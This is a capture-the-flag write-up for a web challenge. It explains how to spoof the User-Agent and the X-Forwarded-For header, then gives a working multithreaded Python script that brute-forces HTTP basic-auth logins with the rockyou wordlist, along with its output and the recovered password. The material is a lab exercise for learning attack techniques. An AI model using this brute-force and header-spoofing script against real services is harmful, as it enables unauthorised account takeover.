# Monster
http://ctf.adl.tw:12002/

## Change Your User Agent in Chrome
Open Chrome's Developer Tools by right-clicking anywhere and choosing Inspect, hitting Ctrl + Shift + I, or by pressing F12  
At the bottom of the resulting panel, you should see a section with the tabs Console, Network conditions, and What's New. Press Esc to show this if you don't see it.

On the Network conditions tab, uncheck Select automatically and you can then choose a new user agent from the list. Refresh to update the page with the new agent.

Note that this setting will revert back to normal when you close the developer panel, and only applies to your current tab.
## How to change your IP
https://chrome.google.com/webstore/detail/x-forwarded-for-header/hkghghbnihliadkabmlcmcgmffllglin/related

## Or just use this extension
https://chrome.google.com/webstore/detail/http-headers/fabjnpecogealbfoebkcjfbmdhnnfhbj?hl=en-GB

# Now, you must login
bocchi & 🤘rockyou!!!
- turns out rockyou is a passw list...
so we write a script to find the passw by brute force
```py
import requests
import numpy as np
import threading
from tqdm import tqdm
tn = 20
lines =[item.strip() for item in open(
    "./debug/rockyou.txt", "r", encoding="latin-1").readlines()]

print(len(lines))
splits = np.array_split(lines, tn)
pbar = tqdm(total=len(lines))


def request(i):
    lines = splits[i]
    for idx, pw in enumerate(lines):
        #print(pw)
        r = requests.get('http://ctf.adl.tw:12002/admin',
                         headers={"X-Forwarded-For": "127.0.0.1",
                                  "User-Agent": "STARRYBrowser",
                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
        if len(r.text) != 1370:
            print(pw)
            with open('./debug/pw.txt', 'w') as f:
                f.write(pw)
            #break
            exit()
        #if idx % 100 == (100 * i) / tn:
        if idx % 100 == 0:
            pbar.update(100)


for i in range(tn):
    t = threading.Thread(target=request, args=(i,))
    t.start()
```
- the password is located around 40% of rockyou
```ps
PS D:\1111_work\1111attack_and_defense\security_2022> py .\web\monster\brute_force_multi_thread.py
14344391
 41%|███████████████████████████████████████████████████████▊                                                                                 | 5849900/14344391 [2:36:26<3:08:18, 751.83it/s]bocchio
```

- now that we have the password, we can use it to login~